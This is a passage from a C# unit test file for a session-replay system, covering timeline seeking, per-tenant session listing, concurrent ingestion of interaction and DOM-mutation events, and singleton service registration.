        // Seek to 3200ms -> should match frame at 3000ms (offset 2000 vs 3000)
        var frame = _coordinator.SeekToOffset(timeline, 3100.0);

        frame.Should().NotBeNull();
        frame!.OffsetMilliseconds.Should().BeApproximately(3000.0, 20.0);

        // Seek before start -> returns first frame
        var first = _coordinator.SeekToOffset(timeline, -500.0);
        first.Should().Be(timeline.Frames[0]);

        // Seek after end -> returns last frame
        var last = _coordinator.SeekToOffset(timeline, 25000.0);
        last.Should().Be(timeline.Frames[^1]);
    }

    [Fact]
    public void ListActiveSessions_FilteredByTenant_ShouldReturnOnlyRecordingSessionsForTenant()
    {
        _coordinator.StartSession(new SessionStartRequest("sess_t1_a", "tenant-alpha"));
        _coordinator.StartSession(new SessionStartRequest("sess_t1_b", "tenant-alpha"));
        _coordinator.StartSession(new SessionStartRequest("sess_t2_c", "tenant-beta"));

        _coordinator.CompleteSession("sess_t1_b"); // completed session

        var alphaSessions = _coordinator.ListActiveSessions("tenant-alpha");
        var betaSessions = _coordinator.ListActiveSessions("tenant-beta");

        alphaSessions.Should().ContainSingle(s => s.SessionId == "sess_t1_a");
        betaSessions.Should().ContainSingle(s => s.SessionId == "sess_t2_c");
    }

    #endregion

    #region 7. Concurrency & Multi-Threaded Streaming

    [Fact]
    public void MultiThreadedInteractionStreaming_ConcurrentIngestion_ShouldBeThreadSafeAndLossless()
    {
        string sessionId = "sess_concurrent_telemetry";
        string pageUrl = "https://sgrowing.com/live";
        const int threadCount = 8;
        const int eventsPerThread = 50;

        Parallel.For(0, threadCount, threadIdx =>
        {
            var events = new List<InteractionEvent>(eventsPerThread);
            var now = DateTimeOffset.UtcNow;

            for (int i = 0; i < eventsPerThread; i++)
            {
                events.Add(new InteractionEvent(
                    EventId: (threadIdx * 1000) + i,
                    Type: InteractionType.PointerMove,
                    X: 10.0 + i,
                    Y: 20.0 + i,
                    ViewportWidth: 1920,
                    ViewportHeight: 1080,
                    ScrollY: 0,
                    ElementSelector: null,
                    Timestamp: now.AddMilliseconds(i * 10)));
            }

            _heatmapService.IngestInteractions(sessionId, pageUrl, events);
        });

        var stored = _heatmapService.GetSessionInteractions(sessionId);
        stored.Should().HaveCount(threadCount * eventsPerThread);

        var heatmap = _heatmapService.GetHeatmap(pageUrl, HeatmapType.Move);
        heatmap.TotalInteractions.Should().Be(threadCount * eventsPerThread);
    }

    [Fact]
    public void MultiThreadedMutationIngestion_DistinctSessions_ShouldNotInterfere()
    {
        const int sessionCount = 10;
        var t0 = DateTimeOffset.UtcNow;

        Parallel.For(0, sessionCount, i =>
        {
            string sId = $"sess_iso_{i}";
            var batch = new DomMutationBatch(
                sId, 1, t0,
                [
                    new DomMutationOperation(1, 1, t0, MutationType.NodeAdded, $"div.sess-{i}", "div"),
                    new DomMutationOperation(2, 2, t0.AddMilliseconds(10), MutationType.AttributeModified, $"div.sess-{i}", "div")
                ]);

            _mutationEngine.IngestMutations(sId, batch);
        });

        for (int i = 0; i < sessionCount; i++)
        {
            var stored = _mutationEngine.GetSessionMutations($"sess_iso_{i}");
            stored.Should().HaveCount(2);
            stored[0].TargetNodePath.Should().Be($"div.sess-{i}");
        }
    }

    #endregion

    #region 8. Dependency Injection Descriptors

    [Fact]
    public void AddSessionReplayServices_ShouldRegisterAllRequiredServicesAsSingletonsWithoutBuildingProvider()
    {
        // Enforce rule: NEVER call services.BuildServiceProvider()
        var services = new ServiceCollection();

        services.AddSessionReplayServices();

        // 1. IPiiScrubbingVaultService registered as Singleton
        var scrubberDesc = services.FirstOrDefault(d => d.ServiceType == typeof(IPiiScrubbingVaultService));
        scrubberDesc.Should().NotBeNull();
        scrubberDesc!.Lifetime.Should().Be(ServiceLifetime.Singleton);
        scrubberDesc.ImplementationType.Should().Be(typeof(PiiScrubbingVaultService));

        // 2. IDomMutationVectorEngine registered as Singleton
        var mutationDesc = services.FirstOrDefault(d => d.ServiceType == typeof(IDomMutationVectorEngine));
        mutationDesc.Should().NotBeNull();
        mutationDesc!.Lifetime.Should().Be(ServiceLifetime.Singleton);
        mutationDesc.ImplementationType.Should().Be(typeof(DomMutationVectorEngine));

        // 3. IUserInteractionHeatmapService registered as Singleton
        var heatmapDesc = services.FirstOrDefault(d => d.ServiceType == typeof(IUserInteractionHeatmapService));
        heatmapDesc.Should().NotBeNull();
        heatmapDesc!.Lifetime.Should().Be(ServiceLifetime.Singleton);
        heatmapDesc.ImplementationType.Should().Be(typeof(UserInteractionHeatmapService));

        // 4. ISessionReplayCoordinator registered as Singleton
        var coordDesc = services.FirstOrDefault(d => d.ServiceType == typeof(ISessionReplayCoordinator));
        coordDesc.Should().NotBeNull();
        coordDesc!.Lifetime.Should().Be(ServiceLifetime.Singleton);
        coordDesc.ImplementationType.Should().Be(typeof(SessionReplayCoordinator));
    }

    #endregion
}
